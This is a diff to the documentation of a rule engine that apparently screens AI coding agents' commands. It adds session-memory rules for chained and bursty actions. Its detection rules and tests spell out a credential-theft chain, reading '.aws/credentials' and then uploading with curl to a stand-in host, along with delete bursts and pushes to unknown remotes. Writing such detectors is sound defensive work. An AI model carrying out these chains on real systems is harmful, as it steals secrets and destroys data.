@@ -45,6 +45,8 @@ rules:
     enabled: true                             # optional, default true
     match: { ... }                            # the condition
     exceptions: [ { ... } ]                   # optional, switches the rule off
+    remember: { ... }                         # optional, writes a mark down
+    threshold: { ... }                        # optional, a count over a window
     tests: [ { ... } ]                        # examples that prove the rule
 ```
 
@@ -65,6 +67,8 @@ silent hole in the protection.
 | `enabled` | bool | `false` loads the rule but never uses it. |
 | `match` | match block | The condition of the rule. See section 3. |
 | `exceptions` | list of match blocks | Any hit switches the rule off. See section 5. |
+| `remember` | remember block | Writes a mark for a later rule. See *Session memory* below. |
+| `threshold` | threshold block | A count over a window. The rule is quiet below it. See *Session memory* below. |
 | `tests` | list of tests | Examples that prove the rule. See section 6. |
 
 ---
@@ -150,6 +154,127 @@ command line **and** in a script writes two branches under `any_of`, one with
 | `any_of` | list of match blocks | At least one block must match. |
 
 A group can hold a group, so you can build any condition.
+
+### Session memory
+
+The blocks above look at one action. Four more blocks let a rule look at the
+whole session. The engine keeps the memory, and the launcher writes it. Read
+section 6 of `ARCHITECTURE.md` for the flow.
+
+Every time in this section is the time of the **event**, never the clock of
+the machine. A replay of a trace therefore gives the same answer as the live
+session.
+
+#### `remember` — write a fact down
+
+A rule field, next to `match`. When the condition of the rule matches, the
+session writes the mark down.
+
+| Field | Type | Meaning |
+| --- | --- | --- |
+| `mark` | text | Name of the mark. It may not be empty. |
+| `scope` | `session` or `subtree` | How far the mark reaches. The default is `session`. |
+| `ttl_seconds` | number | How long the mark counts. Without a value it counts for the whole session. |
+
+`scope: subtree` ties the mark to the process under the root of the session,
+so a fact of one agent task cannot arm a rule in another task.
+
+A rule may exist only to remember. Give it `risk: info` and
+`decision: allow`, and it stays quiet.
+
+```yaml
+  - id: memory.credentials.read-mark
+    risk: info
+    decision: allow
+    match: { action: exec, program: [cat], argv_matches: '\.aws/credentials' }
+    remember: { mark: credential-read, scope: subtree, ttl_seconds: 600 }
+```
+
+#### `marked` — ask about the fact
+
+A match field. It holds when a live mark of that name is visible.
+
+| Field | Type | Meaning |
+| --- | --- | --- |
+| `mark` | text | Name of the mark. |
+| `within_seconds` | number | How old the mark may be. Without a value, any age counts. |
+| `scope` | `session` or `subtree` | `subtree` also asks for the same process subtree. The default is `session`. |
+
+A mark that a rule wrote with `scope: subtree` is invisible outside that
+subtree, whatever the reader asks for.
+
+```yaml
+    match:
+      action: exec
+      marked: { mark: credential-read, within_seconds: 600, scope: subtree }
+      argv_matches: '(?:^|\s)curl(?:\s|$)'
+```
+
+The lint reports a `marked` block whose name no loaded rule writes. That is
+an error, because such a rule can never match.
+
+#### `threshold` — a count over a window
+
+A rule field, next to `match`. The rule counts every time its condition
+matches, and it **fires only when the window holds enough hits**. Below the
+count it stays quiet and writes nothing to the user.
+
+| Field | Type | Meaning |
+| --- | --- | --- |
+| `window_seconds` | number | Length of the trailing window. It must be more than 0. |
+| `at_least` | number | How many hits the window must hold, this action included. It must be at least 2. |
+| `distinct` | `none`, `path`, `host`, `program` or `argv_joined` | What makes two hits different. The default is `none`, which counts every hit. |
+
+With `distinct`, the rule counts the **different values** and not the hits. An
+action that carries no such value adds nothing to the count.
+
+```yaml
+    # Twenty deletes in one minute.
+    threshold: { window_seconds: 60, at_least: 20 }
+
+    # Three different credential files in five minutes.
+    threshold: { window_seconds: 300, at_least: 3, distinct: path }
+```
+
+`distinct: path` needs `action: file_open` and `distinct: host` needs
+`action: network_connect`. The lint reports the other combinations, because
+they can never count.
+
+#### `baseline_missing` — is the value new?
+
+A match field. The launcher records named sets of text at session start. This
+block reads a value out of the joined command line and asks whether the set
+holds it.
+
+| Field | Type | Meaning |
+| --- | --- | --- |
+| `set` | text | Name of the baseline set, for example `git_remotes`. |
+| `capture` | regex | Pattern with **exactly one** group. The group is the value. |
+
+The block holds only when the pattern captures a value **and** the set does
+not hold it. Two cases give no match:
+
+* the pattern captures nothing;
+* the session recorded no set with that name. An unknown set would make every
+  value look new, and a rule that fires on everything is worse than a rule
+  that is quiet.
+
+A pattern without exactly one group is a load error.
+
+The launcher of this version records one set: `git_remotes`, which holds the
+name and the address of every git remote of the work tree. A directory that
+is not a repository gives an empty set, and then every remote is new.
+
+```yaml
+    match:
+      action: exec
+      program: [git]
+      all_of:
+        - argv_matches: '(?:^|\s)push(?:\s|$)'
+        - baseline_missing:
+            set: git_remotes
+            capture: '(?:^|\s)push(?:\s+-{1,2}\S+)*\s+([^\s-]\S*)'
+```
 
 ### Regular expressions
 
@@ -314,9 +439,50 @@ only**, so another rule cannot hide a mistake.
 | `file_open` | `{ path: ..., write: true }` makes a file action. |
 | `connect` | `{ host: ..., addr: ..., port: 5432 }` makes a connection action. |
 | `input` | `{ source: stdin, data: "..." }` makes a captured content action. |
+| `history` | The steps that happened before. See below. |
+| `at_seconds` | Time of the action, in seconds after the start of the test. |
+| `baseline` | The named sets of the session start, for example `{ git_remotes: [origin] }`. |
 
 Without `file_open`, `connect` or `input`, the test builds an `exec` action
 from the `process` block. A test with more than one action is a load error.
+
+### A test with a history
+
+A rule that reads the session memory needs more than one action. The
+`history` list holds the steps that came first. A step has the same shape as
+the action of a test, and it takes three more fields:
+
+| Field | Meaning |
+| --- | --- |
+| `at_seconds` | Time of the step. Without it, the steps stand one second apart. |
+| `repeat` | How many times the step happens, one second apart. The default is 1. |
+| `ancestry` | The parents of the step, as in the test itself. |
+
+The harness plays every step through the whole loaded pack and keeps what the
+rules write, because a mark often comes from another rule. It then judges the
+action of the test **against its own rule only**, exactly as a test without a
+history.
+
+```yaml
+    tests:
+      - name: an upload after a credential read needs approval
+        expect: approval_required
+        history:
+          - process: { comm: cat, argv: [cat, /home/dev/.aws/credentials] }
+            ancestry: [{ comm: bash }, { comm: claude }]
+        process: { comm: curl, argv: [curl, -T, out.txt, "https://drop.example/u"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+      - name: twenty deletes in one minute need approval
+        expect: approval_required
+        history:
+          - repeat: 19
+            process: { comm: rm, argv: [rm, -f, build/tmp.o] }
+        process: { comm: rm, argv: [rm, -f, build/tmp.o] }
+```
+
+Write both halves of a chain as two tests: one that fires, and one for each
+half alone that must stay quiet.
 
 ### `expect_match` and quiet rules
 
@@ -394,20 +560,26 @@ those programs in `program` and asks for the real command with `argv_matches`:
 
 | File | Rules | What it protects |
 | --- | --- | --- |
-| `policies/filesystem.yaml` | 14 | Deletion outside the work tree, credential files, system files, disks. |
-| `policies/git.yaml` | 9 | Force push, protected branches, lost work, rewritten history. |
-| `policies/database.yaml` | 11 | Drop, truncate, statements with no `where`, production servers. |
-| `policies/cloud.yaml` | 14 | Kubernetes, Terraform, AWS, Azure, Google Cloud, containers, Helm. |
-| `policies/network.yaml` | 7 | Downloads that run at once, administration ports, reverse shells. |
-| `policies/process.yaml` | 9 | Programs from temporary places, hidden payloads, deep shell chains. |
+| `policies/filesystem.yaml` | 28 | Deletion outside the work tree, credential files, system files, disks. |
+| `policies/git.yaml` | 16 | Force push, protected branches, lost work, rewritten history. |
+| `policies/database.yaml` | 16 | Drop, truncate, statements with no `where`, production servers. |
+| `policies/cloud.yaml` | 23 | Kubernetes, Terraform, AWS, Azure, Google Cloud, containers, Helm. |
+| `policies/network.yaml` | 18 | Downloads that run at once, administration ports, reverse shells, data that leaves. |
+| `policies/process.yaml` | 33 | Programs from temporary places, hidden payloads, deep shell chains. |
+| `policies/memory.yaml` | 5 | Chains, bursts, sweeps and a remote that the session did not know. |
 | `policies/allowlist.yaml` | 5 | Known safe forms of commands that look dangerous. |
-| **Total** | **69** | |
+| **Total** | **144** | |
 
-Of the 69 rules, 4 answer `deny`, 37 answer `approval_required` and 28 stay
+Of the 144 rules, 9 answer `deny`, 59 answer `approval_required` and 76 stay
 quiet with `allow`. The rules that stop an action only look at commands that
 destroy data. A normal development session — `git status`, `cargo build`,
 `npm test`, `psql -c "SELECT ..."`, `kubectl get pods` — matches no rule at
 all and produces no note.
+
+`policies/memory.yaml` is the only file whose rules need more than one
+action. It holds the chain of a credential read and an upload, a burst of
+deletes, a sweep over several credential stores, and a push to a remote that
+the session start did not know.
 
 ---
 
